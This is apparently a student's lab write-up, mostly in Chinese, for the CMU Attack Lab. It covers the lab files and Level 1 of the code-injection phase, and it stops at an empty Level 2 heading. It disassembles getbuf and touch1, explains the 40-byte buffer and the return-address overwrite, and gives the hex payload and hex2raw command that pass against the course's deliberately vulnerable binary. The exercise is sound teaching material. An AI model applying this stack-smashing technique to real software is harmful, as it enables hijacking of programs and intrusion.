# Attack Lab實驗紀錄

## Intro

This file contains materials for one instance of the **attacklab**.

Files:

```bash
ctarget
```

Linux binary with code-injection vulnerability.  To be used for phases
1-3 of the assignment.

    rtarget

Linux binary with return-oriented programming vulnerability.  To be
used for phases 4-5 of the assignment.

```bash
 cookie.txt
```

Text file containing 4-byte signature required for this lab instance.

```bash
 farm.c
```

Source code for gadget farm present in this instance of `rtarget`.  You
can compile (use flag `-Og`) and disassemble it to look for gadgets.

```bash
 hex2raw
```

Utility program to generate byte sequences.  See documentation in lab
handout.

> 開始實驗前請先閱讀attacklab.pdf文檔

## Part I: Code Injection Attacks

### Level 1

先查看原先的程式碼:

```c
void test(){
    int val;
    val = getbuf();
    printf("No exploit. Getbuf returned 0x%x\n", val);
}
```

然後我們看看`getbuf()`的實現，其實他的功能類似於`gets()`，直到遇上`\n`或`EOF`停止，這點適合我們進行攻擊

```c
unsigned getbuf(){
    char buf[BUFFER_SIZE];
    Gets(buf);
    return 1;
}
```

透過`./ctarget -q`執行`ctarget`後藉由輸入字串進行注入攻擊，目的是將原先`ret`返回地址的流程導向`touch1()`函式

```c
void touch1(){
    vlevel = 1;
    printf("Touch1!: You called touch1()\n");
    validate(1);
    exit(0);
}
```

使用`objdump -d ./ctarget > ctarget.s`反組譯`catarget`

`test()`的組合語言程式碼:

```asm
0000000000401968 <test>:
  401968:	48 83 ec 08          	sub    $0x8,%rsp
  40196c:	b8 00 00 00 00       	mov    $0x0,%eax
  401971:	e8 32 fe ff ff       	callq  4017a8 <getbuf>
  401976:	89 c2                	mov    %eax,%edx
  401978:	be 88 31 40 00       	mov    $0x403188,%esi
  40197d:	bf 01 00 00 00       	mov    $0x1,%edi
  401982:	b8 00 00 00 00       	mov    $0x0,%eax
  401987:	e8 64 f4 ff ff       	callq  400df0 <__printf_chk@plt>
  40198c:	48 83 c4 08          	add    $0x8,%rsp
  401990:	c3                   	retq 
```

`getbuf()`的組合語言程式碼:

```asm
00000000004017a8 <getbuf>:
  4017a8:	48 83 ec 28          	sub    $0x28,%rsp
  4017ac:	48 89 e7             	mov    %rsp,%rdi
  4017af:	e8 8c 02 00 00       	callq  401a40 <Gets>
  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax
  4017b9:	48 83 c4 28          	add    $0x28,%rsp
  4017bd:	c3                   	retq 
```

`touch1()`的組合語言程式碼:

```asm
00000000004017c0 <touch1>:
  4017c0:	48 83 ec 08          	sub    $0x8,%rsp
  4017c4:	c7 05 0e 2d 20 00 01 	movl   $0x1,0x202d0e(%rip)        # 6044dc <vlevel>
  4017cb:	00 00 00 
  4017ce:	bf c5 30 40 00       	mov    $0x4030c5,%edi
  4017d3:	e8 e8 f4 ff ff       	callq  400cc0 <puts@plt>
  4017d8:	bf 01 00 00 00       	mov    $0x1,%edi
  4017dd:	e8 ab 04 00 00       	callq  401c8d <validate>
  4017e2:	bf 00 00 00 00       	mov    $0x0,%edi
  4017e7:	e8 54 f6 ff ff       	callq  400e40 <exit@plt>
```

從上面的結果不難推測出，最終要將返回地址複寫成`0x 00 00 00 00 00 40 17 c0`，此處要特別注意機器是大端還是小端

所以調用`getbuf()`後棧的狀態類似:

```
---------------------------- 
|			   |
|__________________________|
|______return address______| <-- stack + 40
|			   |
|			   |
|           buf            |
|			   |
|			   |
|__________________________| <--top of the stack
```

我們需要填充40個字元，然後再依序填入`c0 17 40 00 00 00 00 00`

官方文件有提到`HEX2TRAW`可以將文件中的hex值轉換成字元(用空白鍵區分)，然後將字串內容輸入給`ctarget`。因此只需要將

```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
c0 17 40 00 00 00 00 00
```

另存成`l1.txt`(名字自己取)，然後執行`./hex2raw < l1.txt | ./ctarget -q`語句就可以了

```
Cookie: 0x59b997fa
Type string:Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: Would have posted the following:
	user id	bovik
	course	15213-f15
	lab	attacklab
	result	1:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 C0 17 40 00 00 00 00 00
```

### Level 2





